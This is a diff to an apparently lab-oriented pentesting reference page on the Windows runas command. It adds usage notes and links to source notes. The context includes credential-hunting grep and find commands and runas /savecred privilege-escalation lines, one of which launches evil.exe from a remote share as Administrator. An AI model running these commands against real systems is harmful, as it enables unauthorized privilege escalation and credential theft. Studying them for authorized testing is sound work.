@@ -9,6 +9,38 @@ hideFooterPagination: true
 
 {/* Generated from Commands/runas.md. Edit the Markdown source, then run scripts/sync_site.py. */}
 
+## runas: choose the operation and read the result
+
+Start a Windows process using another account or saved credentials.
+
+### What the result establishes
+
+Confirm the new process identity and distinguish local-token behavior from outbound network credentials.
+
+### Prerequisites and common failures
+
+/netonly keeps local identity while supplying outbound credentials; a launched process does not prove those credentials have authenticated anywhere.
+
+### Example 1: Prompt for credentials
+
+Run in: **Windows cmd.exe or PowerShell**.
+
+```text
+runas /user:DOMAIN\USER cmd.exe
+```
+
+### Example 2: Use an existing saved credential
+
+Run in: **Windows cmd.exe or PowerShell**. Check cmdkey /list first. This only works when a matching saved credential is available.
+
+```text
+runas /savecred /user:DOMAIN\USER cmd.exe
+```
+
+## Saved commands and notebook recipes
+
+Start a Windows process using another account or saved credentials.
+
 Replace UPPER_CASE values with your lab values.
 
 [Search this tool’s saved examples](/commands/notebook?tool=runas) · [All tools](/index)
@@ -54,6 +86,13 @@ Enter the password for INLANEFREIGHT\adunn:
 Attempting to start powershell as user "INLANEFREIGHT\adunn" ...
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [DCSync Lab — Using runas.exe](/active-directory/dcsync-lab#using-runas-exe)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 </Accordion>
 
 <Accordion title="Find Credentials in Network Shares">
@@ -76,6 +115,13 @@ grep -riE "runas|net use|Invoke-Command|New-PSSession|ConvertTo-SecureString" .
 find . -iname "*svc*" -o -iname "*service*account*"
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Find Credentials in Network Shares — Find Credentials in Network Shares](/password-attacks/credential-hunting-in-network-shares)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 </Accordion>
 
 <Accordion title="High-value Windows locations">
@@ -88,6 +134,13 @@ find . -iname "*svc*" -o -iname "*service*account*"
 cmdkey /list
 runas /savecred /user:DOMAIN\user cmd
 ```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Find Credentials on Windows — High-value Windows locations](/password-attacks/credential-hunting-in-windows#high-value-windows-locations)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
 
 </Accordion>
 
@@ -116,6 +169,13 @@ Type            Keys                                Name
 Container       {Name=backupadmsess}                backupadmsess
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Kerberos Double Hop — Workaround #2: Register PSSession Configuration](/active-directory/kerberos-double-hop#workaround-#2-register-pssession-configuration)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 </Accordion>
 
 <Accordion title="13. Attacking Windows Credential Manager">
@@ -127,6 +187,13 @@ Container       {Name=backupadmsess}                backupadmsess
 ```cmd
 runas /savecred /user:SRV01\mcharles cmd
 ```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Password Attacks: Cracking, Files, and Credential Stores — 13. Attacking Windows Credential Manager](/password-attacks/password-attacks-cheat-sheet#13-attacking-windows-credential-manager)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
 
 </Accordion>
 
@@ -140,6 +207,13 @@ runas /savecred /user:SRV01\mcharles cmd
 runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"
 runas /savecred /user:Administrator "cmd.exe /k whoami"
 ```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Windows Privilege Escalation: Full Checklist — EoP - Runas](/privesc/windows-privesc-checklist#eop-runas)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
 
 </Accordion>
 
@@ -155,6 +229,21 @@ Context from the notebook: cmdkey /list  shows saved creds runas /savecred  as t
 runas /savecred
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Windows Post-Exploitation: Field Reference — 🧾 QUICK REFERENCE — "I see X → do Y"](/cheatsheets/windows-post-exploitation#-quick-reference-—-i-see-x-→-do-y)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 </Accordion>
 
 </AccordionGroup>
+
+{/* VAULT_RELATED_START */}
+
+**Source material and related references**
+
+- [Find Credentials on Windows](/password-attacks/credential-hunting-in-windows)
+
+{/* VAULT_RELATED_END */}
